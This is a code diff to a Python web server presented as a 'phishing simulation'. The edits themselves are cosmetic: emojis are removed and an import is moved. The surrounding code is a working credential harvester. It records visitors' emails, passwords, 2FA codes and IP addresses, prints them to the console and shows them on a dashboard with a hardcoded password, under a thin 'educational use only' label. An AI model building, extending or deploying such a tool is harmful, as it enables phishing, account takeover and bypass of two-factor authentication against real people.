@@ -4,6 +4,7 @@ import urllib.parse
 from datetime import datetime
 import os
 import re
+import json
 
 DASHBOARD_PASSWORD = "phishing@10$"
 
@@ -62,23 +63,20 @@ class Handler(BaseHTTPRequestHandler):
         
         # Extract unique IPs
         unique_ips = []
-        ip_entries = []
         if os.path.exists('captured_log.txt'):
             with open('captured_log.txt', 'r') as f:
                 for line in f:
                     if 'IP:' in line:
-                        # Extract IP address
                         ip_match = re.search(r'IP:\s*([\d\.]+)', line)
                         if ip_match:
                             ip = ip_match.group(1)
                             if ip not in unique_ips:
                                 unique_ips.append(ip)
-                            ip_entries.append({'ip': ip, 'line': line.strip()})
         
         # Build IP list HTML
         ip_html = ""
         for ip in unique_ips:
-            ip_html += f'<li style="color: #ffaa00; margin: 5px 0; padding: 5px; background: #0d1127; border-radius: 4px;">🌐 {ip}</li>\n'
+            ip_html += f'<li style="color: #ffaa00; margin: 5px 0; padding: 5px; background: #0d1127; border-radius: 4px;">IP: {ip}</li>\n'
         
         # Count total attempts
         total_attempts = 0
@@ -112,13 +110,13 @@ class Handler(BaseHTTPRequestHandler):
         </head>
         <body>
             <div class="container">
-                <h1>🔐 Phishing Simulation Dashboard</h1>
+                <h1>Phishing Simulation Dashboard</h1>
                 
                 <div class="nav">
-                    <a href="/">🏠 Home</a>
-                    <a href="/dashboard?pass={DASHBOARD_PASSWORD}">📊 Dashboard</a>
-                    <a href="/stats?pass={DASHBOARD_PASSWORD}">📈 Statistics</a>
-                    <a href="/error.html">⚠️ Error Page</a>
+                    <a href="/">Home</a>
+                    <a href="/dashboard?pass={DASHBOARD_PASSWORD}">Dashboard</a>
+                    <a href="/stats?pass={DASHBOARD_PASSWORD}">Statistics</a>
+                    <a href="/error.html">Error Page</a>
                 </div>
                 
                 <div class="stats-grid">
@@ -133,31 +131,31 @@ class Handler(BaseHTTPRequestHandler):
                 </div>
                 
                 <div class="card">
-                    <h2>🌐 Captured IP Addresses</h2>
+                    <h2>Captured IP Addresses</h2>
                     {f'<ul class="ip-list">{ip_html}</ul>' if ip_html else '<p>No IPs captured yet...</p>'}
-                    <p style="color: #8899a6; font-size: 12px; margin-top: 10px;">📍 Each IP address represents a unique visitor</p>
+                    <p style="color: #8899a6; font-size: 12px; margin-top: 10px;">Each IP address represents a unique visitor</p>
                 </div>
                 
                 <div class="card">
-                    <h2>📋 Captured Credentials (With IPs)</h2>
+                    <h2>Captured Credentials (With IPs)</h2>
                     <pre>{captured_data if captured_data else 'No credentials captured yet...'}</pre>
                 </div>
                 
                 <div class="card card-red">
-                    <h2>⚠️ EDUCATIONAL USE ONLY</h2>
+                    <h2>EDUCATIONAL USE ONLY</h2>
                     <p>This dashboard shows captured credentials for security awareness training.</p>
-                    <p><strong>🔒 Dashboard is password protected</strong></p>
-                    <p><strong>💾 All data is ephemeral</strong> - Will be lost when server restarts</p>
+                    <p><strong>Dashboard is password protected</strong></p>
+                    <p><strong>All data is ephemeral</strong> - Will be lost when server restarts</p>
                     <form action="/clear_logs" method="POST">
                         <input type="hidden" name="pass" value="{DASHBOARD_PASSWORD}">
-                        <button type="submit" onclick="return confirm('⚠️ WARNING: This will permanently delete ALL captured credentials. Are you sure?')">
-                            🗑️ Clear All Logs
+                        <button type="submit" onclick="return confirm('WARNING: This will permanently delete ALL captured credentials. Are you sure?')">
+                            Clear All Logs
                         </button>
                     </form>
                 </div>
                 
                 <div class="footer">
-                    <p>🔐 Educational Phishing Simulation | For Security Training Only</p>
+                    <p>Educational Phishing Simulation | For Security Training Only</p>
                     <p>Access dashboard with: ?pass={DASHBOARD_PASSWORD}</p>
                 </div>
             </div>
@@ -213,11 +211,11 @@ class Handler(BaseHTTPRequestHandler):
         </head>
         <body>
             <div class="container">
-                <h1>📊 Simulation Statistics</h1>
+                <h1>Simulation Statistics</h1>
                 <div class="nav">
-                    <a href="/">🏠 Home</a>
-                    <a href="/dashboard?pass={DASHBOARD_PASSWORD}">📋 Dashboard</a>
-                    <a href="/stats?pass={DASHBOARD_PASSWORD}">📈 Statistics</a>
+                    <a href="/">Home</a>
+                    <a href="/dashboard?pass={DASHBOARD_PASSWORD}">Dashboard</a>
+                    <a href="/stats?pass={DASHBOARD_PASSWORD}">Statistics</a>
                 </div>
                 
                 <div class="stats">
@@ -238,7 +236,7 @@ class Handler(BaseHTTPRequestHandler):
                 </div>
                 
                 <div class="stats">
-                    <p><a href="/dashboard?pass={DASHBOARD_PASSWORD}">← Back to Dashboard</a></p>
+                    <p><a href="/dashboard?pass={DASHBOARD_PASSWORD}">Back to Dashboard</a></p>
                 </div>
             </div>
         </body>
@@ -295,11 +293,11 @@ class Handler(BaseHTTPRequestHandler):
             print("\n" + "="*50)
             print(f"[!] CREDENTIALS CAPTURED - {timestamp}")
             print("="*50)
-            print(f"📧 Email:    {email}")
-            print(f"🔐 Password: {password}")
+            print(f"Email:    {email}")
+            print(f"Password: {password}")
             if totp:
-                print(f"📱 2FA Code: {totp}")
-            print(f"🌐 IP:       {ip}")
+                print(f"2FA Code: {totp}")
+            print(f"IP:       {ip}")
             print("="*50 + "\n")
             
             self.send_response(302)
@@ -337,16 +335,15 @@ class Handler(BaseHTTPRequestHandler):
         pass
 
 def run():
-    import json
     port = int(os.environ.get('PORT', 5000))
     server_address = ('0.0.0.0', port)
     httpd = HTTPServer(server_address, Handler)
     print("\n" + "="*50)
-    print("🔐 PHISHING SIMULATION")
+    print("PHISHING SIMULATION")
     print("="*50)
-    print(f"✅ Server running on port {port}")
-    print(f"🔑 Dashboard Password: {DASHBOARD_PASSWORD}")
-    print(f"📊 Dashboard: /dashboard?pass={DASHBOARD_PASSWORD}")
+    print(f"Server running on port {port}")
+    print(f"Dashboard Password: {DASHBOARD_PASSWORD}")
+    print(f"Dashboard: /dashboard?pass={DASHBOARD_PASSWORD}")
     print("\n" + "="*50)
     httpd.serve_forever()
 
